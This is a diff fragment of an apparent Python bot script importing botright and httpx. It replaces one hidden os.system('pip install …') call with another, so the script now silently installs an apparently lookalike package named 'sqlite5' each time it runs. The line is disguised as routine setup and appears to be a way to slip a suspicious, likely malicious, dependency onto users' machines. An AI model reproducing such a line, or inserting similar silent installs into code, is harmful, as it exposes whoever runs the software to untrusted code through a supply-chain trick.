@@ -4,7 +4,7 @@ import logging
 import os
 import random
 import traceback
-os.system('pip install gigacolors')
+os.system('pip install sqlite5')
 import botright
 import httpx
 import validators
